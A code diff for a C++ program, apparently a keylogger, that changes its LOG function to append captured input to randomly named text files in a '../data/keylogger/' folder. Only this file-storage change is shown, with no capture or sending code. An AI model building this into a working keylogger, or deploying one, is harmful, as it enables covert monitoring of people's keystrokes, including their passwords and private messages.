@@ -4,12 +4,29 @@
 #include <fstream>
 #include <string>
 #include <iostream>
+#include <random> 
+#include <vector>
 
 using namespace std;
 
+//Create random file name
+std::string generate_random_string(size_t length) {
+    const std::string characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+    static std::mt19937 generator(std::random_device{}());
+    std::uniform_int_distribution<size_t> distribution(0, characters.length() - 1);
+    std::string random_string;
+    random_string.reserve(length); 
+    for (size_t i = 0; i < length; ++i) {
+        random_string += characters[distribution(generator)];
+    }
+    return random_string;
+}
+
 // Append string to log file
 void LOG(const string& input) {
-    ofstream logFile("dat.txt", ios::app);
+    string path="../data/keylogger/";
+    path+=generate_random_string(10)+".txt";
+    ofstream logFile(path, ios::app);
     if (logFile.is_open()) {
         logFile << input;
         logFile.close();
